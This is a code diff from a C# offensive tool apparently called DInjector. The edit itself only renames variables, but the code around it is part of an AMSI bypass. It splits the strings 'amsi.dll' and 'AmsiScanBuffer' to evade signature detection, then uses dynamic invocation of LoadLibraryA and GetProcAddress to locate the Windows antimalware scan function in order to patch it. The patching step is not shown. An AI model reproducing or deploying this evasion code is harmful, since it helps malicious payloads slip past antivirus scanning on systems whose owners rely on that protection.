@@ -49,25 +49,25 @@ namespace DInjector
                 var am = "am";
                 var si = "si";
                 var dll = ".dll";
-                object[] LoadLibParams = {am + si + dll};
+                object[] loadLibParams = {am + si + dll};
 
                 // Get LoadLibraryA address
                 IntPtr pointer = DI.DynamicInvoke.Generic.GetExportAddress(pkernel32, "LoadLibraryA");
 
                 // Call LoadLibraryA for the library mentioned above
-                var lib = (IntPtr)DI.DynamicInvoke.Generic.DynamicFunctionInvoke(pointer, typeof(LoadLibraryA), ref LoadLibParams);
+                var lib = (IntPtr)DI.DynamicInvoke.Generic.DynamicFunctionInvoke(pointer, typeof(LoadLibraryA), ref loadLibParams);
 
                 // Function to patch
                 var Am = "Am";
                 var siScan = "siScan";
                 var Buffer = "Buffer";
-                object[] GetProcAddressParams = {lib, Am + siScan + Buffer};
+                object[] getProcAddressParams = {lib, Am + siScan + Buffer};
 
                 // Get GetProcAddress address
                 pointer = DI.DynamicInvoke.Generic.GetExportAddress(pkernel32, "GetProcAddress");
 
                 // Call GetProcAddress for the function mentioned above
-                var addr = (IntPtr)DI.DynamicInvoke.Generic.DynamicFunctionInvoke(pointer, typeof(GetProcAddress), ref GetProcAddressParams);
+                var addr = (IntPtr)DI.DynamicInvoke.Generic.DynamicFunctionInvoke(pointer, typeof(GetProcAddress), ref getProcAddressParams);
 
                 #endregion
 
